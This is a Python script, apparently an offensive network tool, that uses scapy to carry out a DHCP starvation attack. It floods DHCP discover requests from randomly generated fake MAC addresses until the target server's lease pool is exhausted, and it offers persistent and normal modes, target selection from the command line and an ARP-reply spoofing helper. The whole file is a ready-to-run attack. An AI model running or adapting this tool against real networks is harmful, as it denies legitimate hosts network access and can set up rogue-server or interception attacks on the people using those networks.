from scapy.all import *
import logging
import MACCHANGER


# When we run scapy without a default IPV6 gateway it will display an annoying message.
# This will Supress all the messages that have lower level of seriousness than Error messages
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.layers import l2, inet, dhcp
from scapy.layers.l2 import ARP
from scapy import sendrecv

class DHCPStarve:

    def dhcp_discover(self, Fake_MAC, iface):
        packet = (
                l2.Ether(src=mac2str(Fake_MAC),dst="ff:ff:ff:ff:ff:ff") /
                inet.IP(src="0.0.0.0", dst="255.255.255.255") /
                inet.UDP(sport=68, dport=67) /
                dhcp.BOOTP(op=1,chaddr=mac2str(Fake_MAC), xid=random.randint(1, 1000000000), flags=0xFFFFFF) /
                dhcp.DHCP(options=[("message-type", "discover"), "end"])
        )

        sendrecv.sendp(packet, iface=iface, verbose=0)
        print("discover sent")


    def arp_reply(self,src_ip, source_mac, server_ip, server_mac, i_face):
        reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
        # Sends the is at message to the src_mac ()
        send(reply, iface=i_face)
        print("ARP Reply Sent")


    def starve(self,i_face, persistent,target_ip=0):
        """
        performing the actual dhcp starvation by generating a dhcp handshake with a fake mac address

        :param target_ip: the ip of the targeted dhcp server, if none given than 0 (used as a flag)
        :param i_face: the systems network interface for the attack
        :param persistent: a flag indicating if the attack is persistent or temporary
        """
        # print(i_face, persistent)
        if persistent=="false":
            persistent=False
            print("Normal Mode is Running")
        elif persistent=="true":
            persistent=True
            print("Persistant Mode is Running")

        cur_ip = 0
        # if target_ip:
            # server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
        while True:
            counter = 0
            Generated_MAC = MACCHANGER.MAC_CH().Random_MAC_Generator()
            # send a dhcp discover
            self.dhcp_discover(Fake_MAC=Generated_MAC, iface=i_face)
            while True:
                #This is Persistant Mode
                if persistent:
                    # print("Persistant Mode is Running")
                    # If the persistent flag is on, and no offer is received retry after 3 seconds.
                    p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=2)
                    if not len(p):
                        print("resending dhcp discover, no leases found")
                        self.dhcp_discover(Fake_MAC=Generated_MAC, iface=i_face)
                        continue

                #This is Normal Mode
                else:
                    # print("Normal Mode is Running")
                    # If the persistent flag is off, and no offer is received, retry after 3 seconds, 3 tries max.
                    p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=2)
                    if not len(p):                 #If no any packet is sniffed it will retry for 3 times
                        if counter >= 3:
                            # If no answer is received after 3 tries, finish the attack.
                            print("finishing attack")
                            return
                        counter += 1
                        print("retrying")
                        self.dhcp_discover(Fake_MAC=Generated_MAC, iface=i_face)
                        continue

                # Check if the answer is a DHCP offer from the wanted server.
                if dhcp.DHCP in p[0]:
                    if p[0][dhcp.DHCP].options[0][1] == 2:
                        ip = p[0][dhcp.BOOTP].yiaddr
                        src = p[0][inet.IP].src
                        if not target_ip and not src == cur_ip:
                            cur_ip = src
                            server_mac = sr1(ARP(op=1, pdst=str(src)))[0][ARP].hwsrc
                            print(server_mac)
                        if src == target_ip or not target_ip:
                            break
                        continue
            # arp_reply(src_ip=str(ip), source_mac=Generated_MAC, server_ip=str(target_ip), server_mac=server_mac,i_face=i_face)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-p', '--persistent', default=False, action='store_true',
                        help='persistent?')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-t', '--target', metavar="TARGET", default=0, type=str,
                        help='IP of target server')

    args = parser.parse_args()


    DHCPStarve().starve(i_face=args.iface, persistent=args.persistent, target_ip=args.target)
